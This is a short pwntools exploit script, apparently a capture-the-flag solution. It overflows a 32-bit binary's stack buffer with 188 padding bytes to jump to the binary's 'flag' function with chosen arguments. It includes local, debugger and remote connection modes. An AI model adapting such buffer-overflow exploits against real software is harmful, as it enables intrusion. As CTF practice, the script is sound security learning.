#!/usr/bin/env python3

from pwn import *

e = ELF("./vuln_patched")
# libc = ELF('./libc.so.6')
# rop = ROP(e)

context.binary = e
context.terminal = ['tmux', 'split', '-h']
# context.log_level = 'debug'


def conn():
    if args.LOCAL:
        # Use PTY (Pseudo terminal) to avoid some stdin/out buffer issue, e.g. HTB Jeeves
        r = process([e.path], stdin=process.PTY, stdout=process.PTY)
    elif args.GDB:
        r = gdb.debug([e.path], '''
                      b *(vuln+62)
                      b *(flag+0x64)
                      c
                      ''', stdin=process.PTY, stdout=process.PTY)
    elif args.GDB_ATTACH:
        r = process([e.path], stdin=process.PTY, stdout=process.PTY)
        gdb.attach(r, gdbscript='''
                      b *(main)
                      c
                   ''')
    elif args.REMOTE:
        ip, port = args.REMOTE.split(':')
        r = remote(ip, port)
    else:
        error('unknown running mode for the script')

    return r


def main():
    r = conn()

    # Just BF + function call convention for 32-bit binary

    payload = flat(
            b'\x90' * 188,
            e.sym.flag,
            b'\x90' * 4,
            0xdeadbeef,
            0xc0ded00d,
            )
    r.sendlineafter(b':', payload)

    r.interactive()

if __name__ == "__main__":
    main()
